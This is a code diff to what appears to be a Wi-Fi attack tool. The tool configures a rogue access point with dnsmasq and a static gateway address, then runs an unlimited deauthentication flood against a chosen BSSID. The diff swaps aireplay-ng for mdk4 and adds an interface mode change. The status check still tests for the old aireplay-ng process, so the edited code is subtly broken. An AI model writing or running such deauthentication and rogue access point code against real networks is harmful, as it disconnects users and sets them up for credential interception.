@@ -742,6 +742,8 @@ dhcp-authoritative
         f.write(dnsmasq_conf)
     
     # 4. 设置网卡IP
+    run_cmd(['sudo', 'iw', 'dev', iface, 'set', 'type', 'managed'])
+    time.sleep(0.3)
     run_cmd(['sudo', 'ip', 'addr', 'add', '192.168.4.1/24', 'dev', iface])
     up_result = run_cmd(['sudo', 'ip', 'link', 'set', iface, 'up'])
     if up_result.returncode != 0:
@@ -785,7 +787,7 @@ dhcp-authoritative
         'message': '未配置目标BSSID',
     }
     if target_bssid and len(target_bssid) == 17:
-        proc = subprocess.Popen(['sudo', 'aireplay-ng', '--deauth', '0', '-a', target_bssid, iface],
+        proc = subprocess.Popen(['sudo', 'mdk4', iface, 'd', '-B', target_bssid],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         time.sleep(0.2)
         deauth_status['running'] = proc.poll() is None or is_process_running('aireplay-ng')
